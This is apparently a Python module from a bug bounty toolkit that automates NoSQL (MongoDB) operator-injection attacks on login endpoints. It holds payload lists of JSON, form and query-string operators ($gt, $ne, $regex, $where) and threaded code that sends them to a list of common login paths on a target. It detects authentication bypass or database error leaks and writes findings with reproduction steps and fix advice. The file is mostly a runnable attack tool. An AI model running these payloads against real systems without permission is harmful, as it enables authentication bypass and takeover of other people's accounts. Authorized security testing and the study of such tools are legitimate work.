# Bug Bounty Tool Kit  ─  by Hacker00X1  |  Authorized use only
"""NoSQL Injection — MongoDB operator injection via JSON, forms, and query strings."""

import urllib.parse
import urllib.request
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from data.webfuzz import fetch_url

LOGIN_PATHS = [
    "/login","/signin","/api/login","/api/signin","/api/auth",
    "/api/v1/login","/api/v2/login","/auth/login","/user/login",
    "/admin/login","/api/session","/api/authenticate",
]

NOSQL_JSON_PAYLOADS = [
    {"username": {"$gt": ""},         "password": {"$gt": ""}},
    {"username": {"$ne": "invalid"},  "password": {"$ne": "invalid"}},
    {"username": {"$regex": ".*"},    "password": {"$regex": ".*"}},
    {"username": "admin",             "password": {"$gt": ""}},
    {"username": "admin",             "password": {"$ne": "x"}},
    {"username": "admin",             "password": {"$regex": ".*"}},
    {"username": {"$exists": True},   "password": {"$exists": True}},
    {"username": {"$in": ["admin","administrator","root"]}, "password": {"$gt": ""}},
    {"username": {"$where": "this.username == 'admin'"}, "password": {"$gt": ""}},
    {"email": {"$gt": ""},            "password": {"$gt": ""}},
    {"email": {"$ne": "x"},           "password": {"$ne": "x"}},
    {"$where": "1==1"},
]

NOSQL_FORM_PAYLOADS = [
    ("username[$gt]", "", "password[$gt]", ""),
    ("username[$ne]", "invalid", "password[$ne]", "invalid"),
    ("username[$regex]", ".*", "password[$regex]", ".*"),
    ("username[$exists]", "true", "password[$exists]", "true"),
    ("username[$in][]", "admin", "password[$ne]", "x"),
    ("email[$gt]", "", "password[$gt]", ""),
    ("email[$ne]", "x", "password[$ne]", "x"),
]

NOSQL_GET_PAYLOADS = [
    "[$gt]=", "[$ne]=invalid", "[$regex]=.*", "[$exists]=true",
    "[%24gt]=", "[%24ne]=invalid",
]

SUCCESS_INDICATORS = [
    "dashboard","welcome","logout","token","access_token","success",
    "authenticated","profile","account","admin","redirect","jwt",
]

NOSQL_ERROR_SIGS = [
    "SyntaxError","MongoError","Cast to string","Cast to Number",
    "valid operator","query selector","mongodb","mongoose",
    "CouchDB","RethinkDB","Firestore","bson","$where","operator",
    "MongoServerError","DocumentNotFoundError",
]

CVSS_CRIT = "9.8 (Critical) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
CVSS_HIGH = "7.5 (High)     — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"


def _test_json(url: str, timeout: int) -> list[dict]:
    findings = []
    probe = fetch_url(url, timeout=timeout)
    if not probe or probe.get("status") not in (200, 400, 401, 403, 405, 422, 500):
        return findings
    for payload in NOSQL_JSON_PAYLOADS:
        data = json.dumps(payload).encode()
        try:
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/json")
            req.add_header("User-Agent", "BugBountyTool/1.0")
            with urllib.request.urlopen(req, timeout=timeout) as r:
                body = r.read(3000).decode("utf-8", errors="replace")
                status = r.status
            body_lower = body.lower()
            if status in (200, 201) and any(w in body_lower for w in SUCCESS_INDICATORS):
                return [{
                    "type": "NoSQL Injection — Auth Bypass (JSON)",
                    "severity": "CRITICAL",
                    "url": url,
                    "payload": json.dumps(payload),
                    "cvss": CVSS_CRIT,
                    "description": f"NoSQL injection bypassed authentication at {url} using MongoDB operator payload.",
                    "steps_to_reproduce": (
                        f"1. POST {url}\n"
                        f"   Content-Type: application/json\n"
                        f"   Body: {json.dumps(payload)}\n"
                        "2. Observe 200 with authenticated session/token — no valid credentials used."
                    ),
                    "impact": "Complete authentication bypass. Any account accessible including admin.",
                    "recommendation": "Validate and type-check all inputs. Reject object/operator types for credential fields. Use ODM safely (mongoose, Prisma).",
                }]
            if any(sig.lower() in body_lower for sig in NOSQL_ERROR_SIGS):
                return [{
                    "type": "NoSQL Injection — Error Disclosure",
                    "severity": "HIGH",
                    "url": url,
                    "payload": json.dumps(payload),
                    "cvss": CVSS_HIGH,
                    "description": f"NoSQL error triggered — DB type confirmed and injection may be possible at {url}.",
                    "steps_to_reproduce": (
                        f"1. POST {url} with body: {json.dumps(payload)}\n"
                        "2. Observe MongoDB/NoSQL error in response."
                    ),
                    "impact": "DB type confirmed; enumeration and injection likely feasible.",
                    "recommendation": "Sanitize inputs. Suppress DB error messages. Implement input schema validation.",
                }]
        except Exception:
            pass
    return findings


def _test_form(url: str, timeout: int) -> list[dict]:
    findings = []
    probe = fetch_url(url, timeout=timeout)
    if not probe or probe.get("status") not in (200, 400, 401, 403, 405, 422):
        return findings
    for uf, uv, pf, pv in NOSQL_FORM_PAYLOADS:
        payload_str = urllib.parse.urlencode({uf: uv, pf: pv})
        data = payload_str.encode()
        try:
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            req.add_header("User-Agent", "BugBountyTool/1.0")
            with urllib.request.urlopen(req, timeout=timeout) as r:
                body = r.read(2000).decode("utf-8", errors="replace").lower()
                status = r.status
            if status in (200, 302) and any(w in body for w in SUCCESS_INDICATORS):
                return [{
                    "type": "NoSQL Injection — Auth Bypass (Form)",
                    "severity": "CRITICAL",
                    "url": url,
                    "payload": payload_str,
                    "cvss": CVSS_CRIT,
                    "description": f"NoSQL operator injection via form bypassed login at {url}: {uf}={uv}",
                    "steps_to_reproduce": (
                        f"1. POST {url}\n"
                        f"   Content-Type: application/x-www-form-urlencoded\n"
                        f"   Body: {payload_str}\n"
                        "2. Observe successful login response."
                    ),
                    "impact": "Authentication bypass. Login as any user.",
                    "recommendation": "Cast input types explicitly. Sanitize bracket notation in form fields.",
                }]
        except Exception:
            pass
    return findings


def _test_get_params(base_url: str, timeout: int) -> list[dict]:
    findings = []
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query)
    for param in list(qs.keys()):
        for suffix in NOSQL_GET_PAYLOADS:
            test_qs = dict(qs)
            new_param = param + suffix.split("=")[0]
            test_qs[new_param] = [suffix.split("=")[1] if "=" in suffix else ""]
            test_url = urllib.parse.urlunparse(parsed._replace(
                query=urllib.parse.urlencode(test_qs, doseq=True)
            ))
            resp = fetch_url(test_url, timeout=timeout)
            if resp and resp.get("status") == 200:
                body = (resp.get("body") or "").lower()
                if any(sig.lower() in body for sig in NOSQL_ERROR_SIGS):
                    findings.append({
                        "type": "NoSQL Injection — GET Parameter",
                        "severity": "HIGH",
                        "url": test_url,
                        "param": new_param,
                        "cvss": CVSS_HIGH,
                        "description": f"NoSQL operator in GET param '{new_param}' triggered DB error response.",
                        "steps_to_reproduce": f"1. curl -s '{test_url}'\n2. Observe NoSQL error in response.",
                        "impact": "Query manipulation, data exfiltration via operator injection.",
                        "recommendation": "Validate query parameter types. Reject unexpected object/array structures.",
                    })
                    return findings
    return findings


def run(base_url: str, domain: str = "", timeout: int = 5, threads: int = 8, **kwargs) -> dict:
    findings: list[dict] = []
    urls = [base_url.rstrip("/") + p for p in LOGIN_PATHS]
    with ThreadPoolExecutor(max_workers=threads) as ex:
        json_futs = [ex.submit(_test_json, u, timeout) for u in urls]
        form_futs = [ex.submit(_test_form, u, timeout) for u in urls]
        get_fut   = ex.submit(_test_get_params, base_url, timeout)
        for f in as_completed(json_futs + form_futs + [get_fut]):
            findings.extend(f.result())
    return {
        "findings": findings,
        "summary": {
            "login_endpoints_tested": len(urls),
            "json_payloads": len(NOSQL_JSON_PAYLOADS),
            "form_payloads": len(NOSQL_FORM_PAYLOADS),
            "vulnerable": len(findings),
        },
    }


if __name__ == "__main__":
    pass
